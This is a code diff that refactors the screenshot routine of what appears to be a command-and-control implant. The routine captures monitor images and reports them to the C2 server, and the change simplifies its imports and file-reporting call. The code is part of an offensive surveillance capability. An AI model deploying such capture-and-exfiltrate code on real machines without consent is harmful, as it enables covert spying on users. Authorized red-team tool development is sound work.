@@ -1,12 +1,11 @@
-use alloc::string::String;
-use alloc::string::ToString;
+use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use chrono::Utc;
 use eldritch_agent::{Agent, Context};
 use image::ImageFormat;
-use pb::c2::report_file_request;
-use pb::{c2, eldritch};
+use pb::c2::{self, report_file_request};
+use pb::eldritch;
 use std::io::Cursor;
 use xcap::Monitor;
 
@@ -58,10 +57,7 @@ pub fn screenshot(agent: Arc<dyn Agent>, context: Context) -> Result<(), String>
             kind: c2::ReportFileKind::Screenshot as i32,
         };
 
-        let (tx, rx) = std::sync::mpsc::channel();
-        tx.send(req).map_err(|e| e.to_string())?;
-        drop(tx);
-        agent.report_file(rx).map_err(|e| e.to_string())?;
+        agent.report_file(req).map_err(|e| e.to_string())?;
     }
 
     Ok(())
